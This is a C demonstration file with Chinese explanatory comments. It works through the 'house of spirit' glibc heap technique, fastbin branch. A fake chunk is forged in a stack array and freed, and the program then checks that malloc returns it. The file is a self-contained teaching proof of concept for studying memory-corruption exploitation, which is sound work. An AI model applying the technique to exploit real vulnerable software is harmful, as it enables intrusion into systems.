/*
 * 中文导读：本文件是 house_of_spirit 手法的 fastbin 分支，对应 glibc
 * 2.23～2.25。
 *
 * 模拟的漏洞能力：可以对一个指向伪造 user area 的指针调用 free，并且能
 * 控制这块伪造区域前面的 size 字段。
 *
 * 核心流程：先把栈上或全局区的一段内存伪造成一个看起来合法的 chunk，
 * 然后把它 free 掉；fastbin 分支还需要先清空 tcache、并给相邻 chunk 伪造
 * 合理的 next-size 以通过完整性检查，tcache 分支的检查更少，只要求 size
 * 落在正确的尺寸类里、地址满足对齐即可。
 *
 * 成功判据：随后的 malloc 会直接返回伪造 chunk 的 user area 地址。2.43
 * 只删掉了 fastbin 分支用到的机制，tcache 分支在 2.43 上依然成立。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size 字段，
 * p[-2] 是 prev_size。文件中出现的 UAF、越界和 double free 都是刻意
 * 模拟出来的漏洞行为，不是正常的 C 用法。
 *
 * 版本范围以本目录 README 和验证矩阵为准；如果发行版把补丁回移到了旧
 * 版本号上，应以实际的 libc 源码判断，而不是只看版本号。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{

	malloc(1);

	unsigned long long *a;
	// 数组开 10 个元素只是为了留够空间放伪造的 chunk 本身，跟 fastbinsY 的桶数量无关；
	// fake_chunks 就是一段普通内存，之所以能被当成 chunk 使用，是因为 fastbinsY 里的
	// 链表指针会指向它。
	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

	fake_chunks[1] = 0x40; // 这里写入第一个伪 chunk 的 size 字段，0x40 必须与后续申请的内部尺寸一致。

        // 下一个 chunk 的 size 位于 fake_chunks[9]：从当前 size 字段往后跨过 0x40 字节，
        // 也就是 8 个八字节元素，正好落在这里。
	fake_chunks[9] = 0x1234; // 给相邻伪 chunk 写入合理的 nextsize，以通过 free 的边界完整性检查。

	a = &fake_chunks[2];

	free(a);

	void *result = malloc(0x30);

	assert(result == &fake_chunks[2]);
	fprintf(stderr, "[+] Spirit：返回伪块\n");
}
